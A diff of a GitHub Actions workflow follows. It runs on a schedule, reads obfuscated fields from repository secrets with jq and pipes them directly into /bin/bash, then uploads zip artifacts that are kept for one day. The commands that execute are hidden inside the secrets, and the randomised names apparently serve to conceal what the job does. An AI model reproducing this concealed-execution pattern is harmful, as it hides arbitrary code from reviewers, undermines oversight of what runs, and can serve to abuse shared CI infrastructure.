@@ -1,31 +1,26 @@
 name: leihuiboliang
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '35 3/6 * * *'
 
-jobs:  # 9773
+  schedule:
+    - cron: '59 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: leihuiboliang
         env:
-          azthc3051: ${{ secrets.azthc3051 }}
+          vk19888: ${{ secrets.vk19888 }}
         run: |
-          echo $azthc3051 | jq -r .u60 | /bin/bash
-          echo $uwz8 | jq -r .mx68844 | /bin/bash
-          echo $fi87139 | jq -r .ngwfe7 | /bin/bash
-          echo $g10 | jq -r .ywdb35386 | /bin/bash
-          echo $xgbmm60 | jq -r .thgvb4791 | /bin/bash
-          echo $ac111 | jq -r .ne053 | /bin/bash
-          echo $moe4908 | jq -r .mjxy38 | /bin/bash
-          echo $maqau4 | jq -r .ievb7 | /bin/bash
-          echo $wvmc3 | jq -r .c33 | /bin/bash
-          echo $u35271 | jq -r .pz46474 | /bin/bash
-          echo $ghh0788 | jq -r .au9002 | /bin/bash
-          echo $zozix04137 | jq -r .mmo068 | /bin/bash
-          echo $asdqb9 | jq -r .pbz5361 | /bin/bash
+          printf '%s' "$vk19888" | jq -r .hwj5 | /bin/bash
+          printf '%s' "$ij99566" | jq -r .xfw27 | /bin/bash
+          echo $s1 | jq -r .nwewn3127 | /bin/bash
+          echo $qrxa16976 | jq -r .yfrb1168 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: id0sa5BZ
+          path: "*.zip"
+          retention-days: 1
